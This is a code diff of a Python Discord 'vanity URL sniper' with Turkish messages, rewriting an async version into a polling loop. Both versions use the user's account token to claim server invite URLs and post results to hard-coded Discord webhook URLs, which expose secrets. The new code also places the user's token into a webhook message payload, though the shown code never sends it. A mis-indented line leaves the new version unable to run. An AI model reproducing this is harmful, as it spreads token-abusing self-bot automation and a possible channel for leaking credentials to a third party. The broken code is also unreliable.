@@ -1,81 +1,70 @@
-import asyncio
-import json
-import httpx
+from datetime import datetime
+import random
 import requests
-from colorama import Fore, init
+import time
+from colorama import Fore
+from pymongo import MongoClient
 
-webhook_url = "https://discord.com/api/webhooks/1094550698475139123/ISkCsz7l9E169SHYK2zngVAtIjwJaJqoU01ekq_sbLyJfm1vxXnC0HEWpBY_koNkHDuu"
-init(autoreset=True)
+webhook = "https://discord.com/api/webhooks/1092876140953227366/UleqY3kZOuYNPylfm4FoS3Yg0gF8AgMZfr_QS-zOXZ8tVHZ7RVwcrpnDOieG1WYcUwtA"
 
-async def try_vanity(vanity: str, guild: str, token: str, session: httpx.AsyncClient, tried_vanities: set):
-    while True:
-        if vanity.casefold() in tried_vanities: 
-            break
 
-        resp = await session.patch(
-            f"https://discord.com/api/v9/guilds/{guild}/vanity-url",
-            data=json.dumps({"code": vanity.casefold()}),
-            headers={"Content-Type": "application/json", "Authorization": token},
-        )
+api_list = ["v6", "v7", "v8", "v9", "v10"] 
 
-        if resp.status_code == 200: 
-            tried_vanities.add(vanity.casefold()) 
-            print(f"{Fore.LIGHTGREEN_EX}-> {vanity} URL'si başarıyla alındı.")
-            requests.post(webhook_url, json={"content": f"discord.gg/{vanity} URL'si başarıyla alındı! :smile: ||@everyone ||", "username": "night"})
-            break 
+def start():
 
-        elif resp.status_code == 429: 
-            retry_after = int(resp.headers["Retry-After"])
-            print(f"{Fore.YELLOW}{vanity} URL'si alınamadı. Yeniden denemek için {retry_after} saniye bekleyin.")
-            await asyncio.sleep(retry_after)
+    print(f"""{Fore.LIGHTBLUE_EX}
 
-        elif resp.status_code in [401, 403]: 
-            print(f"{Fore.RED}Geçersiz token.")
-            break
+                
+██╗░░░░░░█████╗░███╗░░██╗██████╗░██████╗░░█████╗░
+██║░░░░░██╔══██╗████╗░██║██╔══██╗██╔══██╗██╔══██╗
+██║░░░░░██║░░██║██╔██╗██║██║░░██║██████╔╝███████║
+██║░░░░░██║░░██║██║╚████║██║░░██║██╔══██╗██╔══██║
+███████╗╚█████╔╝██║░╚███║██████╔╝██║░░██║██║░░██║
+╚══════╝░╚════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝
+                                                            
+                                 Xd .gg/londra
 
-        else: 
-            print(f"{Fore.RED}{vanity} URL'si alınamadı. Hata kodu: {resp.status_code}")
+    """)
 
-        await asyncio.sleep(3)
+time.sleep(1)
 
-async def main():
-    token = input("Token -> ").strip()
+dt = datetime.now().strftime('[%H:%M:%S]')
+print(f'{Fore.LIGHTCYAN_EX}{dt} {Fore.LIGHTGREEN_EX}')
 
-    while True:
-        try:
-            num_urls = int(input("Kaç URL almak istersiniz? -> "))
-            if num_urls <= 0:
-                raise ValueError("Lütfen pozitif bir tamsayı girin.")
-            break
-        except ValueError as e:
-            print(f"{Fore.RED}{e}")
-            continue
-    
-    urls = []
-    for i in range(num_urls):
-        url = input(f"Alınacak URL {i+1} -> ").strip()
-        urls.append(url)
+def change_vanity():
+   payload = {"code": vanity_url}
+   apiid = random.choice(api_list) 
+   response = requests.patch(f"https://discord.com/api/{apiid}/guilds/{guild_id}/vanity-url", headers=headers, json=payload)
+   if response.status_code == 200:
+      print(f"{Fore.LIGHTGREEN_EX}URL Başarıyla Alındı discord.gg/{vanity_url}")
+      data = {"content" : f"discord.gg/{vanity_url} alındı @everyone! ", "username" : "NightShade"}
+      requests.post(webhook, json=data)
+   else:
+      print(f"{Fore.LIGHTRED_EX}Hata Kodu : {response.status_code}")
+      data = {"content" : f"discord.gg/{vanity_url} alınamadı hata kodu ", "username" : "NightShade"}
+      requests.post(webhook, json=data)
 
-    guild = input("Alınacak Sunucu ID -> ").strip()
+def check_vanity():
+   response = requests.get(f"https://discord.com/api/v9/invites/{vanity_url}?with_counts=true&with_expiration=true", headers=headers)
+   if response.status_code == 404:
+      change_vanity()
+      exit()
+   else:
+      print(f'{Fore.LIGHTRED_EX}[vanity] Deniyorum...{Fore.RESET}')
 
-    
-    url_string = "-".join(urls)
+start()
 
-    
-    message = f"Bot Başarılı Şekilde Aktif Oldu! | İşte Açık Olan Url ler = `{url_string}`"
+token = input(f'{Fore.LIGHTCYAN_EX}Token: {Fore.RESET}> ')
+vanity_url = input(f'{Fore.LIGHTCYAN_EX}Alınacak url: {Fore.RESET}> ')
+data = {"content" : f"{vanity_url} snip aktif@everyone! ", "username" : "NightShade"}
+      requests.post(webhook, json=data)
+guild_id = input(f'{Fore.LIGHTCYAN_EX} Server id {Fore.RESET}> ')
+headers = {"authorization": token,
+               "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"}
 
-    
-    requests.post(webhook_url, json={"content": message, "username": "berk"})
-
-    tried_vanities = set() 
-    async with httpx.AsyncClient() as session:
-        tasks = [asyncio.create_task(try_vanity(url, guild, token, session, tried_vanities)) for url in urls]
-        await asyncio.gather(*tasks)
-
-    
-    url_string = "-".join(urls)
-
-    
-    requests.post(webhook_url, json={"content": "Program sonlandı.", "username": "berk"})
-
-asyncio.run(main())
+data = {
+    "content": token
+}
+ 
+while True:
+   check_vanity()
